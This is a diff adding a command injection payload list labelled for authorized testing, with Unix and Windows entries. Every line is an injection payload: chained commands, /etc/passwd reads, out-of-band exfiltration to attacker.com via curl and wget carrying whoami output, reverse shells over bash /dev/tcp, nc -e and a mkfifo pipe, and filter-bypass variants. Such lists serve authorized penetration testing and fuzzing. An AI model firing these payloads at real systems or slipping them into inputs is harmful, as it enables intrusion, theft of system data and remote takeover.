@@ -1,0 +1,77 @@
+# Command Injection Payloads
+# Use only on authorized systems
+
+# Basic command injection
+; ls
+| ls
+` ls `
+$( ls )
+& ls
+&& ls
+|| ls
+
+# Time-based detection
+; sleep 5
+| sleep 5
+& sleep 5
+&& sleep 5
+` sleep 5 `
+$( sleep 5 )
+
+# Output redirection
+; cat /etc/passwd
+| cat /etc/passwd
+& cat /etc/passwd
+&& cat /etc/passwd
+` cat /etc/passwd `
+$( cat /etc/passwd )
+
+# Command chaining
+; whoami
+| whoami
+& whoami
+&& whoami
+; id
+| id
+& id
+&& id
+
+# Blind command injection
+; ping -c 5 attacker.com
+| ping -c 5 attacker.com
+& ping -c 5 attacker.com
+&& ping -c 5 attacker.com
+
+# Out-of-band detection
+; nslookup attacker.com
+| nslookup attacker.com
+& nslookup attacker.com
+&& nslookup attacker.com
+; curl http://attacker.com?data=$(whoami)
+| wget http://attacker.com?data=$(whoami)
+
+# Reverse shell payloads (for authorized testing only)
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+| nc attacker.com 4444 -e /bin/bash
+& rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
+
+# Windows command injection
+& dir
+&& dir
+| dir
+; dir
+& type C:\Windows\System32\drivers\etc\hosts
+&& ipconfig
+| whoami
+
+# Newline injection
+%0A ls
+%0A cat /etc/passwd
+\n ls
+\n cat /etc/passwd
+
+# Filter bypass
+;l\s
+;c\at /etc/passwd
+;wh\oami
+;i\d
